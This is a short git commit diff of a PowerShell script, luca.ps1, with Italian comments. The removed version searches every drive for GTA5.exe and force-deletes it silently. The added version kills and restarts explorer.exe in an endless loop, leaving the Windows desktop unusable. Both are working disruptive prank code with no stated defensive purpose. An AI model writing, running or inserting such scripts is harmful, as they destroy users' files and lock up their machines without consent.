09a97bfa455d8559fe08346e89594d44bdeabac1
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-06-02 18:30:18 +0200

    Update luca.ps1

--- luca.ps1
+++ luca.ps1
@@ -1,21 +1,8 @@
-# Ottieni tutte le unità del file system e le loro informazioni di utilizzo
-$drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name="Used";Expression={[math]::Round($_.Used/1GB, 2)}}, @{Name="Free";Expression={[math]::Round($_.Free/1GB, 2)}}
-
-# Visualizza le unità in formato tabella
-$drives | Format-Table -Property Name, Used, Free
-
-# Filtra le unità per includere solo quelle con un nome a singola lettera
-$availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$'}
-
-foreach ($drive in $availableDrives) {
-    $driveName = $drive.Name
-
-    # Ottieni tutti i file .exe nell'unità ricorsivamente
-    $files = Get-ChildItem "${driveName}:\\" -Recurse -Filter *.exe -ErrorAction SilentlyContinue
-
-    foreach ($file in $files) {
-        if ($file.Name -eq "GTA5.exe") {
-            Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
-        }
+while ($true) {
+    try {
+        Stop-Process -Name explorer -Force
+        Start-Process explorer.exe
+    } catch {
+        Write-Host "Errore: $_"
     }
 }
